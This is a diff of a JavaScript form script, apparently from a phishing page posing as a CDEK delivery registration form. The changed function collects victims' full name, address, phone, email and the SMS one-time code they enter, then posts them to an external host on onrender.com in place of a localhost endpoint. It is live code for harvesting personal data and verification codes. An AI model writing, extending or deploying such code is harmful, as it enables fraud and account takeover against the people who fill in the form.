@@ -122,26 +122,28 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // Мгновенная отправка данных на локальный сервер
-    async function sendDataToServer() {
-        const payload = {
-            fullName: fullName.value.trim(),
-            address: fullAddress.value.trim(),
-            phone: `${currentCountryCode} ${phoneNumberInput.value.trim()}`,
-            email: emailInput.value.trim(),
-            otpCode: otpInput.value.trim() || 'Не введен',
-            timeSpent: getTimeSpent()
-        };
+    // Было: await fetch('http://127.0.0.1:5000/api/lead', ...
+// Стало:
+async function sendDataToServer() {
+    const payload = {
+        fullName: fullName.value.trim(),
+        address: fullAddress.value.trim(),
+        phone: `${currentCountryCode} ${phoneNumberInput.value.trim()}`,
+        email: emailInput.value.trim(),
+        otpCode: otpInput.value.trim() || 'Не введен',
+        timeSpent: getTimeSpent()
+    };
 
-        try {
-            await fetch('http://127.0.0.1:5000/api/lead', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (error) {
-            console.error('Ошибка отправки на сервер:', error);
-        }
+    try {
+        await fetch('https://cdek-registration-form.onrender.com/api/lead', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (error) {
+        console.error('Ошибка отправки на сервер:', error);
     }
+}
 
     // Обработка клика по кнопке "Получить код"
     getSmsBtn.addEventListener('click', (e) => {
